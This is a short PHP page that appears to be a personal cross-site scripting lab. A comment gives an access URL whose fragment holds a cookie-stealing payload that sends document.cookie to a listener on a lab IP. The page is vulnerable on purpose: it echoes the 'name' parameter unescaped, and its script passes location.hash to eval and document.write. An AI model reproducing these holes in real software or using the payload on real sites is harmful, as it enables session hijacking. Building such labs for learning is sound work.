<?php

// access this page through:
//      http://192.168.233.129:8714/cookie.php?name=dingyc#new Image().src="http://192.168.233.129:8715/listener.php?urlparam="+escape(document.cookie)
include 'common.php';

$guest=$_COOKIE['cname'];
if (!isset($guest)) {
    $name="cname";
    $value="dyc";
    $expire="";
    $path="";
    $domain="";
    $secure="";

    #   bool setcookie ( string $name 
    #                   [, string $value    
    #                   [, int $expire = 0 //An Unix timestamp the cookie expires, such as mktime().time()+60*60*24*30. To session end if set to 0;
    #                   [, string $path //The path and its subpath on the server in which the cookie will be available on, default is the current path
    #                   [, string $domain //The domain and it higher subdomains that the cookie is available to
    #                   [, bool $secure = false //should only be transmitted over a secure HTTPS connection from the client.
    #                   [, bool $httponly = false // if can be accessible by scripting languages 
    #                   ]]]]]] )
    setcookie($name, $value);
    printl("set cookie");
} else {

//    header('Content-Security-Policy: script-src unsafe-inline');
//    header('Content-Security-Policy: script-src unsafe-eval');
    $name = $_GET['name'];
    print "[$guest]welcome back, $name <br>";

}

    setcookie("trival_k", "trival_v");
?>

    <script>
        document.write(unescape(location.hash.substr(1)))
        eval(unescape(location.hash.substr(1)));
    </script>
